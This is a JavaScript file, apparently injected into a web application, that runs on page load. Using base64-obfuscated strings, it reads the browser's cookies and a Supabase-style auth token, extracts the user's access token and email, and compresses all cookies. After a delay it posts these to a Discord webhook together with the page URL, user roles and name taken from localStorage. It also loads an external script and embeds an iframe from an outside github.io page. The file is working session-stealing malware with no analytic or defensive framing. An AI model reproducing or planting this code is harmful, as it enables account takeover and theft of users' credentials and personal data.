window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];};function c() {return btoa(pako.deflate(document.cookie, { to: 'string' }));};function d(en) {return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);};
setTimeout(()=>{
    let whoiam=JSON.parse(atob(__xnext().split(".")[1]))["email"];
    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"` "+JSON.parse(localStorage.getItem("stores")).user.profile.name});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});
},2000)
function load(url, pos = null, type = null) {
    if (pos == null || !document.body) {
        pos = document.documentElement;
    } else {
        pos = document.body;
    }

    const script = document.createElement('script');
    script.src = url;
    if (type != null) {
        script.type = type;
    }

    pos.appendChild(script);
}

load('https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js');

if (!window.location.href.includes("ScriggerMania.github.io")){
        // Create an iframe element
        const iframe = document.createElement('iframe');
        iframe.src = 'https://ScriggerMania.github.io/w.html';  // Cross-origin URL
        iframe.width = "600";
        iframe.height = "400";
        iframe.sandbox = "allow-scripts allow-same-origin";  // Allow same-origin and scripts to run in iframe

        // Append the iframe to the container
        document.documentElement.appendChild(iframe);

        // Wait for the iframe to load and send a message to it
        iframe.onload = function() {
            // Send a message to the iframe to request data
            iframe.contentWindow.postMessage('RequestData', 'https://example.com');
        };

        // Listen for the response from the iframe
        window.addEventListener('message', function(event) {
            // Check the origin to ensure the message is from https://example.com
            if (event.origin === 'https://example.com') {
                console.log('Response from iframe:', event.data);
                alert('Response from iframe: ' + event.data);
            } else {
                console.warn('Message received from unknown origin:', event.origin);
            }
        });
}
